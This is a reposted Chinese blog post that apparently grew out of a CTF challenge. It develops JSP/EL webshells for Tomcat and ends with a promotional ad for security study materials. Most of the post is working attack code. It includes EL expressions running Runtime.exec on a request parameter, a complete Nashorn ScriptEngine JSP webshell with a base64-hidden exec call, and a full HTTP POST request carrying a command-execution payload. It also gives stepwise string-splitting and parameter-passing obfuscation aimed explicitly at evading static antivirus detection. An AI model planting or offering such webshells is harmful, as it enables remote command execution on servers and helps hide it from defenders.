# 转载
：  webshell初探

# webshell初探

通过RWCTF2022的一道web联想到的EL webshell简单实现与混淆

**目录**

[0x0 RWCTF引发的思考](#0x0%20RWCTF%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83)

[0x01 简单尝试与回显问题](#0x01%20%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95%E4%B8%8E%E5%9B%9E%E6%98%BE%E9%97%AE%E9%A2%98)

[0x02 EL + ScriptEngine](#0x02%20EL%20%2B%20ScriptEngine)

[0x03 进一步混淆](#0x03%20%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B7%B7%E6%B7%86)

[0x04 总结](#0x04%20%E6%80%BB%E7%BB%93)

[免费领取安全学习资料包！（私聊进群一起学习，共同进步）​编辑](#%E5%85%8D%E8%B4%B9%E9%A2%86%E5%8F%96%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%8C%85%EF%BC%81%EF%BC%88%E7%A7%81%E8%81%8A%E8%BF%9B%E7%BE%A4%E4%B8%80%E8%B5%B7%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%85%B1%E5%90%8C%E8%BF%9B%E6%AD%A5%EF%BC%89%E2%80%8B%E7%BC%96%E8%BE%91)

---


## 0x0 RWCTF引发的思考

​ 前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：

​ 如果我们单独处理bypass，那么其实很好解决：
1. 尖括号 &lt;% %&gt;：使用EL表达式
```
//&lt;%Runtime.getRuntime.exec(request.getParameter("cmd"));%&gt;
//替换成为
${Runtime.getRuntime().exec(param.cmd)}

```

这样就避免出现了尖括号。

2.圆括号 () : java 代码编译解析器会识别 Unicode 形式的编码，所可以直接unicode

```
//&lt;%Runtime.getRuntime().exec("calc");%&gt;
&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;

```

但是要完全bypass，显然两者都是不行的，那么最终的方式是采用EL表达式中的 **'.'** 与 **'='** 。

```
${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
//等同于
pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter("a"));

```

通过这种方式我们可以获得ClassLoader修改一些tomcat的属性，最终达到利用session写shell的目的，当然到目前这道题目只是完成了一小部分，后面还涉及到如何使Tomcat reload 并实现持久化贮存session的问题等等，各位感兴趣的可以看一下长亭官方的wp。

​ **这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**

### 0x01 简单尝试与回显问题

我们使用开头提到的EL表达式来试一试：

```
${Runtime.getRuntime().exec(param.cmd)}

```

<br/> 执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：**调用ScriptEngine来执行js**。

> 
我们使用ScriptEngine构造出的webshell是这样的：
<pre><code>&lt;%@ page import="javax.script.ScriptEngineManager" %&gt;
&lt;%@ page import="java.util.Base64" %&gt;
&lt;%@ page import="java.io.BufferedReader" %&gt;
&lt;%@ page import="java.io.InputStreamReader" %&gt;
&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;
&lt;%
    String s = "s=[3];s[0]='cmd';s[1]='/c';s[2]='";
    String cmd = request.getParameter("cmd");
    String rt = new String(Base64.getDecoder().decode("JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs="));
    Process process = (Process) new ScriptEngineManager().getEngineByName("nashorn").eval(s + cmd + rt);
    InputStreamReader reader = new InputStreamReader(process.getInputStream());
    BufferedReader buffer = new BufferedReader(reader);
    s = null;
    while ((s = buffer.readLine()) != null) {
        response.getWriter().println(s);
    }
%&gt;
</code></pre>
很好理解，获取nashorn JavaScript引擎实现命令执行。


想到这种方法是因为我们可以尽可能的减少webshell中的代码量，通过传递指定的js代码来执行脚本，从而更好地绕过文件内容检测。

### 0x02 EL + ScriptEngine

首先我们在webshell中通过反射配合动态传递参数的方式获取Engine并执行eval。

```
//test.jsp
${''.getClass().forName(param.spr1).newInstance().getEngineByName("javascript").eval(param.spr2)}

```

首先反射获取ScriptEngineManager对象：

```
test.jsp?spr1=javax.script.ScriptEngineManager

```

然后调用js引擎执行脚本，我们将上方给出的ScriptEngine版本的webshell进行改造，将其改造成js版本：

```
try{
    load("nashorn:mozilla_compat.js");
}
catch (e){
}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
s=[2];
s[0]='cmd';
s[1]='/c whoami /all';
a="";
b=java.lang.Runtime.getRuntime().exec(s).getInputStream();
output+=new BufferedReader(new+InputStreamReader(b));
while ((line=output.readLine()) != null) 
{
    o=o+line+"\n"
};o

```

然后我们将其传入执行js，最终的包长这样

```
POST /test.jsp?spr1=javax.script.ScriptEngineManager HTTP/1.1
Host: 172.20.10.2:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=4A34A77B78CD48404804BFD7420A0195
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 414

spr2=try{load("nashorn%3amozilla_compat.js")%3b}catch(e){}importPackage(Packages.java.util)%3bimportPackage(Packages.java.lang)%3bimportPackage(Packages.java.io)%3bs%3d[2]%3bs[0]%3d'cmd'%3bs[1]%3d'/c+whoami'%3ba%3d""%3bb%3djava.lang.Runtime.getRuntime().exec(s).getInputStream()%3boutput+%3d+new+BufferedReader(new+InputStreamReader(b))%3bwhile+((line%3doutput.readLine())+!%3d+null)+{a%3da%2bline%2b"\n"}%3ba

```

然后执行，没有问题。

### 0x03 进一步混淆

虽然已经可以通过传递指定js脚本执行命令，但仔细来看

```
${''.getClass().forName(param.spr1).newInstance().getEngineByName("javascript").eval(param.spr2)}

```

这段代码还是包含了一些较为敏感的关键字，譬如forName、getEngineByName、eval等，作为一个webshell来讲，显然是不够“干净整洁”的；为进一步混淆，我们可以采用动态传递的方式来替换关键字。

在EL表达式中，我们知道获取属性可以使用a.b或者a['b']，使用后者就意味着我们可以把所有属性和方法转化成字符串：

```
${""["getClass"]()["forName"]("javax.script.ScriptEngineManager")["newInstance"]()["getEngineByName"]("JavaScript")["eval"]("...")}

```

那么这样做有什么好处呢？

首先我们可以**随意拼接**：

```
${""["ge"+"tCl"+"ass"]()["for"+"Name"]("javax.scr"+"ipt.ScriptEng"+"ineManager")["newIn"+"stance"]()["getEng"+"ineByName"]("Java"+"Script")["e"+"val"]("...")}

```

更重要的是如此我们可以**将字符串通过param.xxx**来传递，这样就可以实现如下的改造：

```
${""[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)}

```

测试后可以执行：

这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。

### 0x04 总结

这个小思路也是启发于这位师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的另类使用。

我们从最初的

```
${Runtime.getRuntime().exec(param.cmd)}

```

到

```
${''.getClass().forName(param.spr1).newInstance().getEngineByName("javascript").eval(param.spr2)}

```

再到

```
${""[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)}

```

可以发现这种webshell的优势也很明显：

当然这只是个demo，它还可以更美观比如将cmd通过占位符提取出来放到headers里；再比如我们的body有点臃肿，我们直接用python封装实现一个交互式shell也不错。

## **免费领取安全学习资料包！（私聊进群一起学习，共同进步）**<img alt="" height="768" src="https://img-blog.csdnimg.cn/cf89488fe6c8419db27a66ee328ce560.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/04562e88da4f41aa8e32da0acd67a051.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/fbda6e296eca478fb03891669282ce7d.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/97ee239041c04672a299a15c3a76073b.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/25459eef6e4a44f8848888b074dd55f9.png" width="665"/>

应急响应笔记

学习路线

```
原文链接：https://forum.butian.net/share/1876
```
